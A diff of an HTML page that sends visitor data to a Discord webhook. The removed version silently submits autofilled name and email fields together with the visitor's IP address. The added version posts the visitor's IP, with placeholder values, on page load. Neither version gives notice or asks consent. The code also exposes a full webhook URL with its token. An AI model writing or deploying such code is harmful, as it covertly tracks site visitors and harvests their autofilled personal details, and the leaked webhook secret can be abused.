@@ -3,51 +3,23 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>User Information Form</title>
+  <title>Automatic Submission</title>
 </head>
 <body>
-  <h1>User Information Form</h1>
-
-  <form id="userForm" autocomplete="on">
-    <label for="fname">First Name</label><br>
-    <input type="text" id="fname" name="given-name" autocomplete="given-name" required><br><br>
-
-    <label for="lname">Last Name</label><br>
-    <input type="text" id="lname" name="family-name" autocomplete="family-name" required><br><br>
-
-    <label for="email">Email</label><br>
-    <input type="email" id="email" name="email" autocomplete="email" required><br><br>
-  </form>
-
+  <h1>Automatic Submission in Progress...</h1>
+  
   <script>
     // Replace with your actual Discord webhook URL
     const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1316507623830458530/AJs1HDBblw6pbV0MldGNLKA3pusxfwjPjFg1qKZ7qO3UcCLtkbTv5SIHvXTVS1FK9z58';
 
-    const form = document.getElementById('userForm');
-    const fnameField = document.getElementById('fname');
-    const lnameField = document.getElementById('lname');
-    const emailField = document.getElementById('email');
+    // These could be static or dynamically generated values.
+    // Since no interaction is desired, we just define them here.
+    const fname = 'AutoFirstName';
+    const lname = 'AutoLastName';
+    const email = 'auto@example.com';
 
-    // Automatically focus on the first field when the page loads
-    window.onload = () => {
-      fnameField.focus();
-    };
-
-    // A function to check if all fields are filled
-    function checkFields() {
-      if (fnameField.value.trim() !== '' && lnameField.value.trim() !== '' && emailField.value.trim() !== '') {
-        // Once all fields are filled, submit the form
-        submitForm();
-      }
-    }
-
-    function submitForm() {
-      // Gather form data
-      const fname = fnameField.value.trim();
-      const lname = lnameField.value.trim();
-      const email = emailField.value.trim();
-
-      // Fetch user IP and then send data to Discord
+    // On page load, fetch IP and then send data automatically
+    window.addEventListener('load', () => {
       fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
         .then(data => {
@@ -56,13 +28,12 @@
         })
         .catch(err => {
           console.error('Error fetching IP:', err);
-          // Even if we fail to get the IP, we can still send what we have.
           sendToDiscord(fname, lname, email, 'IP not found');
         });
-    }
+    });
 
     function sendToDiscord(fname, lname, email, ip) {
-      const message = `New user info submitted:\n**First Name:** ${fname}\n**Last Name:** ${lname}\n**Email:** ${email}\n**IP Address:** ${ip}`;
+      const message = `New user info submitted automatically:\n**First Name:** ${fname}\n**Last Name:** ${lname}\n**Email:** ${email}\n**IP Address:** ${ip}`;
 
       fetch(DISCORD_WEBHOOK_URL, {
         method: 'POST',
@@ -78,15 +49,6 @@
       })
       .catch(err => console.error('Error sending message to Discord:', err));
     }
-
-    // Listen for input changes to detect autofill or typing
-    fnameField.addEventListener('input', checkFields);
-    lnameField.addEventListener('input', checkFields);
-    emailField.addEventListener('input', checkFields);
-
-    fnameField.addEventListener('change', checkFields);
-    lnameField.addEventListener('change', checkFields);
-    emailField.addEventListener('change', checkFields);
   </script>
 </body>
 </html>
